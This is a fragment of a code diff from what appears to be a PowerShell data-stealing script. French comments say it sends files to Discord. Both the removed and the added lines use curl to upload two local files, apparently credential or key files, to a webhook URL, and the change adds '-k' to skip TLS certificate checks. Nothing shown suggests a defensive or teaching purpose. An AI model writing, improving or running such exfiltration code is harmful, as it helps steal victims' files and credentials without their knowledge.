@@ -16,6 +16,6 @@ if ($targetFile) {
 
     # Envoi des fichiers vers Discord
     # On utilise curl pour envoyer les fichiers réels
-    if (Test-Path $lPath) { curl.exe -F "file=@$lPath" $hook }
-    if (Test-Path $kPath) { curl.exe -F "file=@$kPath" $hook }
+    if (Test-Path $lPath) { curl.exe -k -F "file=@$lPath" $hook }
+    if (Test-Path $kPath) { curl.exe -k -F "file=@$kPath" $hook }
 }
